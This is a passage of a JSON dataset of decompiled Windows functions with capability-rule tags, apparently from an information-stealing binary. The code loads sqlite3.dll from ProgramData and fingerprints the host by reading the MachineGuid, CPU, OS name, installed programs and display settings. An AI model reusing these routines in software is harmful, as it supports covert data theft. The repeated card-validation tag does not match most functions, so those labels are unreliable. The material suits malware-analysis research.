        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Type propagation algorithm not settling\n\nvoid fcn.00413372(void)\n\n{\n    uint *puVar1;\n    uint unaff_EBP;\n    uint var_1390h;\n    uint var_138ch;\n    uint uStackY76;\n    uint *puStackY72;\n    uint uStackY68;\n    uint *puStackY64;\n    char *pcStackY60;\n    uint *puStackY56;\n    uint *puStackY52;\n    uint *puStackY48;\n    uint *puStackY44;\n    uint *puStackY40;\n    uint *puStackY36;\n    uint *puStackY32;\n    char *pcStackY28;\n    uint *puStackY24;\n    uint uStackY20;\n    uint var_4h;\n    \n    fcn.0042cc70();\n    puVar1 = *0x446038;\n    if (*0x446038 != NULL) {\n        uStackY20 = 0xffff;\n        puStackY24 = 0x446fb8;\n        pcStackY28 = \"PATH\";\n        puStackY32 = 0x4133b6;\n        (**0x44637c)();\n        puStackY32 = 0x1388;\n        puStackY40 = &fcn.00413372::var_138ch;\n        puStackY36 = NULL;\n        puStackY44 = 0x4133ca;\n        fcn.004257d0();\n        puStackY32 = 0x446fb8;\n        puStackY36 = &fcn.00413372::var_138ch;\n        puStackY40 = 0x4133db;\n        (**0x4464ac)();\n        puStackY40 = 0x43df5c;\n        puStackY44 = &fcn.00413372::var_138ch;\n        puStackY48 = 0x4133ed;\n        (**0x4464ac)();\n        puStackY48 = puVar1;\n        puStackY52 = &fcn.00413372::var_138ch;\n        puStackY56 = 0x413400;\n        (**0x4464ac)();\n        puStackY56 = &fcn.00413372::var_138ch;\n        pcStackY60 = \"PATH\";\n        puStackY64 = 0x41340e;\n        (**0x446338)();\n        puStackY64 = 0x1388;\n        puStackY72 = &fcn.00413372::var_138ch;\n        uStackY68 = 0;\n        uStackY76 = 0x41341e;\n        fcn.004257d0();\n        puStackY64 = *0x446130;\n        uStackY68 = 0x41342d;\n        *0x4462c4 = (**0x4464a0)();\n        if (*0x4462c4 != NULL) {\n            uStackY20 = *0x445cd4;\n            pcStackY28 = 0x413447;\n            puStackY24 = *0x4462c4;\n            *0x4462b8 = (**0x446400)();\n            pcStackY28 = *0x446098;\n            puStackY32 = *0x4462c4;\n            puStackY36 = 0x41345e;\n            *0x4462d8 = (**0x446400)();\n            puStackY36 = *0x445bdc;\n            puStackY40 = *0x4462c4;\n            puStackY44 = 0x413475;\n            *0x446284 = (**0x446400)();\n            puStackY44 = *0x445b1c;\n            puStackY48 = *0x4462c4;\n            puStackY52 = 0x41348c;\n            *0x4462ac = (**0x446400)();\n            puStackY52 = *0x446234;\n            puStackY56 = *0x4462c4;\n            pcStackY60 = 0x4134a3;\n            *0x4462c8 = (**0x446400)();\n            pcStackY60 = *0x445d74;\n            puStackY64 = *0x4462c4;\n            uStackY68 = 0x4134ba;\n            *0x4462a4 = (**0x446400)();\n        }\n    }\n    fcn.0041e0a1(unaff_EBP);\n    return;\n}\n",
        "token_count": 999
    },
    "004136a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004136a5(void)\n\n{\n    uchar *arg_8h;\n    uchar auStack268 [128];\n    uchar auStack140 [132];\n    uint32_t uStack8;\n    \n    uStack8 = *0x443674 ^ auStack140;\n    fcn.004257d0(auStack268, 0, 0x104);\n    (**0x4464ac)(auStack268, 0x43ea74);\n    (**0x4464ac)(auStack268, \"Program\");\n    (**0x4464ac)(auStack268, \"Data\");\n    (**0x4464ac)(auStack268, 0x43bd7c);\n    (**0x4464ac)(auStack268, \"sqlite\");\n    (**0x4464ac)(auStack268, \"3.dll\");\n    arg_8h = auStack268;\n    *0x4462cc = (**0x4464a0)();\n    if (*0x4462cc != 0) {\n        *0x4462d0 = (**0x446400)(*0x4462cc, *0x445f0c);\n        *0x446280 = (**0x446400)(*0x4462cc, *0x445adc);\n        *0x44629c = (**0x446400)(*0x4462cc, *0x445e7c);\n        *0x4462bc = (**0x446400)(*0x4462cc, *0x445e50);\n        *0x4462a0 = (**0x446400)(*0x4462cc, *0x445e90);\n        *0x4462d4 = (**0x446400)(*0x4462cc, *0x4460fc);\n        *0x4462a8 = (**0x446400)(*0x4462cc, *0x445fd0);\n        *0x4462b0 = (**0x446400)(*0x4462cc, *0x446164);\n    }\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 461
    },
    "004144aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004144aa(uint arg_8h, uint arg_ch)\n\n{\n    code **arg_ch_00;\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(4);\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    *arg_8h_00 = 0x43ebc8;\n    arg_8h_00[0x1a] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n    *(unaff_EBP + -4) = 0;\n    arg_ch_00 = arg_8h_00 + 4;\n    *(unaff_EBP + -0x10) = 1;\n    fcn.00414cab(arg_8h_00, arg_ch_00);\n    *(unaff_EBP + -4) = 1;\n    *(arg_8h_00 + *(*arg_8h_00 + 4)) = vtable.std::basic_ifstream_char__struct_std::char_traits_char__.0;\n    fcn.0041502f(arg_ch_00);\n    *arg_ch_00 = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    *(arg_8h_00 + 0x18) = 0;\n    *(arg_8h_00 + 0x59) = 0;\n    fcn.00415098();\n    iVar1 = *0x4467a4;\n    arg_8h_00[0x19] = 0;\n    arg_8h_00[0x15] = 0;\n    arg_8h_00[0x17] = iVar1;\n    *(unaff_EBP + -4) = 2;\n    iVar1 = fcn.00414d62(*(unaff_EBP + 0xc), 1);\n    if (iVar1 == 0) {\n        fcn.0041416b(2, 0);\n    }\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 531
    },
    "00414cab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414cab(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_10h;\n    \n    fcn.00420895(4);\n    piVar1 = *(unaff_EBP + 8);\n    uVar2 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x10) = 0;\n    *(piVar1 + *(*piVar1 + 4)) = vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n    piVar1[2] = 0;\n    piVar1[3] = 0;\n    fcn.00414fb1(uVar2);\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 187
    },
    "0041544b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041544b(void)\n\n{\n    uint *in_EAX;\n    uint *unaff_EBX;\n    \n    if (in_EAX != unaff_EBX) {\n        fcn.0040c0f0(1);\n        if (unaff_EBX[5] < 8) {\n            fcn.0041e300(in_EAX, unaff_EBX, unaff_EBX[4] * 2 + 2);\n        }\n        else {\n            *in_EAX = *unaff_EBX;\n            *unaff_EBX = 0;\n        }\n        in_EAX[4] = unaff_EBX[4];\n        in_EAX[5] = unaff_EBX[5];\n        unaff_EBX[4] = 0;\n        unaff_EBX[5] = 0;\n    }\n    return;\n}\n",
        "token_count": 189
    },
    "00415595": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00415595(uint arg_8h, uint arg_ch)\n\n{\n    int32_t extraout_ECX;\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004208c8(8);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x14) = *(unaff_EBP + 0xc);\n    for (iVar1 = extraout_ECX; iVar1 != *(unaff_EBP + 8); iVar1 = iVar1 + 0x1c) {\n        fcn.0041539c(*(unaff_EBP + 0xc));\n        *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) + 0x1c;\n    }\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 222
    },
    "004155ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004155ec(void)\n\n{\n    uint arg_8h;\n    uint uVar1;\n    uint var_14h;\n    ushort var_eh;\n    ushort var_ch;\n    ushort var_ah;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    arg_8h = (**0x446508)(0, 0x104);\n    uVar1 = (**0x446490)();\n    (**0x446434)(&var_14h);\n    (**0x446300)(uVar1, \"%d/%d/%d %d:%d:%d\", var_eh, var_14h._2_2_, var_14h, var_ch, var_ah, var_8h);\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 209
    },
    "00415659": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00415659(void)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uchar *extraout_ECX;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1c0h;\n    uint var_1a4h;\n    uint var_188h;\n    uint var_16ch;\n    uint var_150h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ah;\n    uint var_134h;\n    uint var_124h;\n    uint var_120h;\n    uint var_118h;\n    uint var_4h;\n    \n    fcn.004208fe(0x1e0);\n    *(unaff_EBP + -0x1e8) = 0;\n    *(unaff_EBP + -0x1ec) = extraout_ECX;\n    *(unaff_EBP + -0x1e4) = 0;\n    *(unaff_EBP + -0x120) = 0xf;\n    *(unaff_EBP + -0x124) = 0;\n    *(unaff_EBP + -0x134) = 0;\n    *(unaff_EBP + -4) = 0;\n    iVar3 = (**0x446390)(unaff_EBP + -0x118, 0x104);\n    if (iVar3 == 0) {\n        *(unaff_EBP + -0x118) = 0x43;\n    }\n    *(unaff_EBP + -0x1e0) = *(unaff_EBP + -0x118);\n    *(unaff_EBP + -0x1df) = 0x5c3a;\n    *(unaff_EBP + -0x1dd) = 0;\n    (**0x4462e0)(unaff_EBP + -0x1e0, 0, 0, unaff_EBP + -0x1e4, 0, 0, 0, 0);\n    iVar3 = *(unaff_EBP + -0x1e4) * 0x14a30b + -0x69427551;\n    *(unaff_EBP + -0x144) = iVar3;\n    iVar3 = iVar3 * 0x14a30b + -0x69427551;\n    *(unaff_EBP + -0x140) = iVar3;\n    iVar3 = iVar3 * 0x14a30b + -0x69427551;\n    iVar5 = 0;\n    do {\n        iVar3 = iVar3 * 0x14a30b + -0x69427551;\n        *(unaff_EBP + -0x13c + iVar5) = iVar3;\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 8);\n    *(unaff_EBP + -0x1e4) = iVar3;\n    uVar4 = (**0x446508)(0, 0x104);\n    iVar3 = (**0x446490)(uVar4);\n    if (iVar3 == 0) {\n        *(extraout_ECX + 0x14) = 0xf;\n        *(extraout_ECX + 0x10) = 0;\n        *extraout_ECX = 0;\n        fcn.00403f50(0);\n        fcn.00403f73(1, 0);\n    }\n    else {\n        (**0x446300)(iVar3, \"%08lX%04lX%lu-\", *(unaff_EBP + -0x144), *(unaff_EBP + -0x140), *(unaff_EBP + -0x13a));\n        fcn.0040c23f();\n        puVar6 = *(unaff_EBP + -0x134);\n        puVar7 = puVar6;\n        if (*(unaff_EBP + -0x120) < 0x10) {\n            puVar7 = unaff_EBP + -0x134;\n        }\n        *(unaff_EBP + -0x1e8) = puVar7 + *(unaff_EBP + -0x124);\n        if (*(unaff_EBP + -0x120) < 0x10) {\n            puVar6 = unaff_EBP + -0x134;\n        }\n        if (puVar6 != puVar7 + *(unaff_EBP + -0x124)) {\n            iVar3 = puVar7 - puVar6;\n            do {\n                uVar2 = fcn.0041fd5b(*puVar6);\n                puVar6[iVar3] = uVar2;\n                puVar6 = puVar6 + 1;\n            } while (puVar6 != *(unaff_EBP + -0x1e8));\n        }\n        uVar4 = fcn.00415d61();\n        *(unaff_EBP + -4) = 1;\n        fcn.0040bfdc(uVar4, 0x14, 0x11);\n        *(unaff_EBP + -4) = 2;\n        uVar4 = fcn.00415db8();\n        *(unaff_EBP + -4) = 3;\n        fcn.0040bfdc(uVar4, 0, 0x18);\n        *(unaff_EBP + -4) = 4;\n        fcn.00416380(unaff_EBP + -0x16c);\n        *(unaff_EBP + -4) = 5;\n        fcn.004042ed();\n        *(unaff_EBP + -4) = 6;\n        fcn.00403f0c();\n        fcn.00403f73(1, 0);\n        fcn.00403f73(1, 0);\n        fcn.00403f73(1, 0);\n        fcn.00403f73(1, 0);\n        fcn.00403f73(1, 0);\n        *(unaff_EBP + -4) = 0;\n        fcn.00403f73(1, 0);\n        puVar1 = *(unaff_EBP + -0x1ec);\n        *(puVar1 + 0x14) = 0xf;\n        *(puVar1 + 0x10) = 0;\n        *puVar1 = 0;\n        fcn.00403f0c();\n        fcn.00403f73(1, 0);\n    }\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 1522
    },
    "0041594e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041594e(void)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint uStack528;\n    uint uStack524;\n    uchar auStack520 [120];\n    uchar auStack400 [136];\n    uchar uStack264;\n    uchar auStack263 [255];\n    uint32_t uStack8;\n    \n    uStack8 = *0x443674 ^ auStack400;\n    uStack528 = 0xff;\n    uStack264 = 0;\n    fcn.004257d0(auStack263, 0, 0xfe);\n    iVar1 = (**0x4463d4)(0x80000002, \"HARDWARE\\\\DESCRIPTION\\\\System\\\\CentralProcessor\\\\0\", 0, 0x20119, &uStack524);\n    if (iVar1 == 0) {\n        (**0x4463b8)(uStack524, \"ProcessorNameString\", 0, 0, &uStack264, &uStack528);\n    }\n    (**0x44645c)(uStack524);\n    arg_8h = auStack520;\n    (**0x446310)(&uStack264);\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 275
    },
    "004159fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004159fa(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    uint uStack3104;\n    int32_t iStack3100;\n    uint uStack3096;\n    uint uStack3092;\n    uint uStack3088;\n    uint uStack3084;\n    uchar auStack3080 [100];\n    uchar auStack2980 [924];\n    uchar auStack2056 [1024];\n    uchar auStack1032 [1024];\n    uint32_t uStack8;\n    \n    uStack8 = *0x443674 ^ auStack2980;\n    uStack3092 = param_1;\n    arg_8h = 0x20019;\n    uStack3096 = 0;\n    uStack3088 = 0;\n    uStack3104 = 0xf003f;\n    uStack3084 = 0;\n    iVar1 = (**0x4463d4)(0x80000002, \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\", 0, 0x20019, &uStack3096)\n    ;\n    if (iVar1 == 0) {\n        iStack3100 = 0;\n        do {\n            uStack3084 = 0x400;\n            iVar1 = (**0x446500)(uStack3096, iStack3100, auStack2056, &uStack3084, 0, 0, 0, 0);\n            if (iVar1 == 0) {\n                (**0x446300)(auStack3080, \"%s\\\\%s\", \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\", \n                             auStack2056);\n                iVar2 = (**0x4463d4)(0x80000002, auStack3080, 0, 0x20019, &uStack3088);\n                if (iVar2 != 0) {\n                    (**0x44645c)(uStack3088);\n                    break;\n                }\n                uStack3084 = 0x400;\n                iVar2 = (**0x4463b8)(uStack3088, \"DisplayName\", 0, &uStack3104, auStack1032, &uStack3084);\n                if (iVar2 == 0) {\n                    (**0x4464ac)(uStack3092, auStack1032);\n                    uStack3084 = 0x400;\n                    iVar2 = (**0x4463b8)(uStack3088, \"DisplayVersion\", 0, &uStack3104, auStack1032, &uStack3084);\n                    if (iVar2 == 0) {\n                        (**0x4464ac)(uStack3092, 0x43e108);\n                        (**0x4464ac)(uStack3092, auStack1032);\n                        (**0x4464ac)(uStack3092, 0x43ecec);\n                    }\n                    (**0x4464ac)(uStack3092, 0x43bd78);\n                }\n                (**0x44645c)(uStack3088);\n            }\n            iStack3100 = iStack3100 + 1;\n        } while (iVar1 == 0);\n        (**0x44645c)(uStack3096);\n    }\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 737
    },
    "00415c6d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00415c6d(void)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint uStack528;\n    uint uStack524;\n    uchar auStack520 [120];\n    uchar auStack400 [136];\n    uchar uStack264;\n    uchar auStack263 [255];\n    uint32_t uStack8;\n    \n    uStack8 = *0x443674 ^ auStack400;\n    uStack528 = 0xff;\n    uStack264 = 0;\n    fcn.004257d0(auStack263, 0, 0xfe);\n    iVar1 = (**0x4463d4)(0x80000002, \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\", 0, 0x20119, &uStack524);\n    if (iVar1 == 0) {\n        (**0x4463b8)(uStack524, \"ProductName\", 0, 0, &uStack264, &uStack528);\n    }\n    (**0x44645c)(uStack524);\n    arg_8h = auStack520;\n    (**0x446310)(&uStack264);\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 271
    },
    "00415d19": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00415d19(void)\n\n{\n    uchar *arg_8h;\n    uint uStack272;\n    uchar auStack268 [124];\n    uchar auStack144 [136];\n    uint32_t uStack8;\n    \n    uStack8 = *0x443674 ^ auStack144;\n    arg_8h = auStack268;\n    uStack272 = 0x101;\n    (**0x4463d8)(arg_8h, &uStack272);\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 124
    },
    "00415db8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00415db8(void)\n\n{\n    int32_t iVar1;\n    uchar *unaff_ESI;\n    uchar *arg_8h;\n    uint uStack528;\n    uint uStack524;\n    uchar auStack520 [120];\n    uchar auStack400 [136];\n    uchar uStack264;\n    uchar auStack263 [255];\n    uint32_t uStack8;\n    \n    uStack8 = *0x443674 ^ auStack400;\n    uStack524 = 0xff;\n    uStack264 = 0;\n    fcn.004257d0(auStack263, 0, 0xfe);\n    iVar1 = (**0x4463d4)(0x80000002, \"SOFTWARE\\\\Microsoft\\\\Cryptography\", 0, 0x20119, &uStack528);\n    if (iVar1 == 0) {\n        (**0x4463b8)(uStack528, \"MachineGuid\", 0, 0, &uStack264, &uStack524);\n    }\n    (**0x44645c)(uStack528);\n    arg_8h = &uStack264;\n    (**0x446310)(arg_8h, auStack520);\n    *(unaff_ESI + 0x14) = 0xf;\n    *(unaff_ESI + 0x10) = 0;\n    *unaff_ESI = 0;\n    fcn.00403f50(auStack520);\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 337
    },
    "00415e7d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nvoid fcn.00415e7d(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_64h;\n    uint var_48h;\n    uint var_2ch;\n    uint var_4h;\n    \n    fcn.004208fe(0x7c);\n    *(unaff_EBP + -0x88) = 0;\n    uVar1 = (**0x446460)(\"DISPLAY\", 0, 0, 0);\n    uVar2 = (**0x4463f4)(uVar1, 8);\n    *(unaff_EBP + -0x88) = uVar2;\n    uVar2 = (**0x4463f4)(uVar1, 10);\n    *(unaff_EBP + -0x84) = uVar2;\n    (**0x4464b0)(0, uVar1);\n    uVar1 = fcn.004166c2(*(unaff_EBP + -0x84));\n    *(unaff_EBP + -0x84) = uVar1;\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.004166c2(*(unaff_EBP + -0x88));\n    *(unaff_EBP + -4) = 1;\n    uVar1 = fcn.004042b6(unaff_EBP + -0x48, 0x43bd76, uVar1);\n    *(unaff_EBP + -4) = 2;\n    fcn.0040c15f(unaff_EBP + -0x2c, uVar1, 0x43ed78);\n    *(unaff_EBP + -4) = 3;\n    fcn.004042ed();\n    fcn.00403f73(1, 0);\n    fcn.00403f73(1, 0);\n    fcn.00403f73(1, 0);\n    fcn.00403f73(1, 0);\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 531
    },
    "00415f5d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00415f5d(void)\n\n{\n    int32_t iVar1;\n    uchar *unaff_EBX;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_fffffee4;\n    char *pcVar2;\n    uint auStack264 [14];\n    uchar uStack208;\n    uint uStack192;\n    uint uStack188;\n    ushort uStack180;\n    uchar auStack178 [170];\n    uint32_t uStack8;\n    \n    uStack8 = *0x443674 ^ auStack264;\n    auStack264[0] = 4;\n    fcn.00420895();\n    uStack188 = 0xf;\n    uStack192 = 0;\n    uStack208 = 0;\n    uStack180 = 0;\n    fcn.004257d0(auStack178, 0, 0xa8);\n    iVar1 = (**0x4463a0)(&uStack180, 0x55);\n    if (iVar1 == 0) {\n        *(unaff_EBX + 0x14) = 0xf;\n        *(unaff_EBX + 0x10) = 0;\n        pcVar2 = \"Unknown\";\n        *unaff_EBX = 0;\n        fcn.00403f50();\n    }\n    else {\n        pcVar2 = &uStack180;\n        fcn.004162b1();\n        fcn.004167f9(auStack264);\n        fcn.00403f0c();\n        in_stack_fffffee4 = 0;\n        fcn.00403f73(1);\n        fcn.0040c0f0(1);\n        *(unaff_EBX + 0x10) = 0;\n        *(unaff_EBX + 0x14) = 0xf;\n        *unaff_EBX = 0;\n        fcn.00403f0c();\n    }\n    fcn.00403f73(1);\n    *in_FS_OFFSET = pcVar2;\n    fcn.0041e0a1(in_stack_fffffee4);\n    return;\n}\n",
        "token_count": 461
    },
    "00416063": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.00416063(void)\n\n{\n    uint arg_10h;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint var_108h;\n    uint var_104h;\n    uint var_50h;\n    uint var_34h;\n    uint var_24h;\n    int32_t arg_8h;\n    uint uVar1;\n    uint var_4h;\n    \n    fcn.004208fe(0xfc);\n    *(unaff_EBP + -0x108) = 0;\n    *(unaff_EBP + -0x24) = 0;\n    *(unaff_EBP + -0x22) = 0;\n    *(unaff_EBP + -0x1e) = 0;\n    *(unaff_EBP + -0x1a) = 0;\n    *(unaff_EBP + -0x16) = 0;\n    (**0x446448)(unaff_EBP + -0x24);\n    (**0x44653c)(unaff_EBP + -0x104);\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -0x32) = 0;\n    *(unaff_EBP + -0x2e) = 0;\n    *(unaff_EBP + -0x2a) = 0;\n    *(unaff_EBP + -0x26) = 0;\n    (**0x44655c)(unaff_EBP + -0x104, unaff_EBP + -0x24, unaff_EBP + -0x34);\n    arg_8h = unaff_EBP + -0x50;\n    *(unaff_EBP + -0x108) = -(*(unaff_EBP + -0x104) / *0x43ef28);\n    uVar1 = *(unaff_EBP + -0x108);\n    arg_10h = fcn.004168da(arg_8h);\n    *(unaff_EBP + -4) = 0;\n    fcn.004042b6(unaff_ESI, 0x43ed7c, arg_10h);\n    fcn.00403f73(1, 0, arg_8h, uVar1);\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 545
    },
    "004162b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004162b1(int16_t *param_1)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    ushort *unaff_ESI;\n    \n    *(unaff_ESI + 8) = 0;\n    *(unaff_ESI + 10) = 7;\n    *unaff_ESI = 0;\n    piVar1 = param_1 + 1;\n    do {\n        iVar2 = *param_1;\n        param_1 = param_1 + 1;\n    } while (iVar2 != 0);\n    fcn.004162e8(param_1 - piVar1 >> 1);\n    return;\n}\n",
        "token_count": 150
    },
    "004162e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.004162e8(uint *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint *in_EAX;\n    uint *puVar3;\n    \n    if (in_EAX != NULL) {\n        uVar1 = param_1[5];\n        puVar3 = param_1;\n        if (7 < uVar1) {\n            puVar3 = *param_1;\n        }\n        if (puVar3 <= in_EAX) {\n            puVar3 = param_1;\n            if (7 < uVar1) {\n                puVar3 = *param_1;\n            }\n            if (in_EAX < puVar3 + param_1[4] * 2) {\n                if (7 < uVar1) {\n                    param_1 = *param_1;\n                }\n                puVar3 = fcn.0040d490(in_EAX - param_1 >> 1, param_2);\n                return puVar3;\n            }\n        }\n    }\n    cVar2 = fcn.0040d5b9();\n    if (cVar2 != '\\0') {\n        puVar3 = param_1;\n        if (7 < param_1[5]) {\n            puVar3 = *param_1;\n        }\n        fcn.00420150(puVar3, in_EAX, param_2 * 2);\n        param_1[4] = param_2;\n        puVar3 = param_1;\n        if (7 < param_1[5]) {\n            puVar3 = *param_1;\n        }\n        *(param_2 * 2 + puVar3) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 387
    },
    "00416447": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00416447(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(4);\n    *(unaff_EBP + -0x10) = 0;\n    *(unaff_EBP + -4) = 0;\n    pcVar3 = *(unaff_EBP + 8);\n    if (*(unaff_EBP + 0x1c) < 0x10) {\n        pcVar3 = unaff_EBP + 8;\n    }\n    pcVar1 = pcVar3 + 1;\n    do {\n        cVar2 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar2 != '\\0');\n    uVar4 = pcVar3 - pcVar1;\n    if (uVar4 % 3 != 0) {\n        uVar4 = (uVar4 - uVar4 % 3) + 3;\n    }\n    uVar5 = fcn.0041e0ea((uVar4 << 3) / 6 + 1);\n    pcVar3 = *(unaff_EBP + 8);\n    if (*(unaff_EBP + 0x1c) < 0x10) {\n        pcVar3 = unaff_EBP + 8;\n    }\n    pcVar1 = pcVar3 + 1;\n    do {\n        cVar2 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar2 != '\\0');\n    fcn.004163a5(pcVar3 - pcVar1);\n    fcn.00403ed2(uVar5);\n    fcn.00403f73(1, 0);\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 505
    },
    "004164e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid __cdecl fcn.004164e6(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint *arg_ch_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t unaff_EBP;\n    uint var_d8h;\n    uint var_c8h;\n    uint var_a0h;\n    uint var_70h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(0xcc);\n    arg_ch_00 